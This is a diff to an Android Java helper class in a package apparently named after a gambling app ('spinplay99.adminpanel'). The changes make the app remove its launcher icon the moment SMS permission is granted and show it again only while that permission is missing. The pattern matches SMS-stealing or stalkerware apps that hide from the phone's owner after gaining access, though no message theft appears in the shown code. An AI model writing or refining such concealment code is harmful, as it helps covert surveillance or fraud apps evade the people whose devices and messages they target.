@@ -96,16 +96,21 @@ public final class PermissionHelper {
         launchAttempted = false;
     }
 
-    /** Remove drawer icon after SMS is granted (MainActivity stays INFO-only). */
+    private static ComponentName launcherAlias(Context context) {
+        return new ComponentName(context.getPackageName(), "com.spinplay99.adminpanel.LauncherAlias");
+    }
+
+    /** Remove drawer icon once SMS works — do not wait for contacts/notifications. */
     public static void hideLauncherIcon(Context context) {
         if (!hasSmsPermissions(context)) {
             return;
         }
         try {
-            ComponentName alias = new ComponentName(context, LauncherAlias.class);
             PackageManager pm = context.getPackageManager();
+            ComponentName alias = launcherAlias(context);
             int state = pm.getComponentEnabledSetting(alias);
-            if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+            if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                || state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
                 return;
             }
             pm.setComponentEnabledSetting(
@@ -116,13 +121,15 @@ public final class PermissionHelper {
         }
     }
 
-    /** Show drawer icon again when SMS is missing (permission setup). */
+    /** Show drawer icon only while SMS permission is still missing. */
     public static void showLauncherIcon(Context context) {
+        if (hasSmsPermissions(context)) {
+            return;
+        }
         try {
-            ComponentName alias = new ComponentName(context, LauncherAlias.class);
             PackageManager pm = context.getPackageManager();
             pm.setComponentEnabledSetting(
-                alias,
+                launcherAlias(context),
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 PackageManager.DONT_KILL_APP);
         } catch (Exception ignored) {
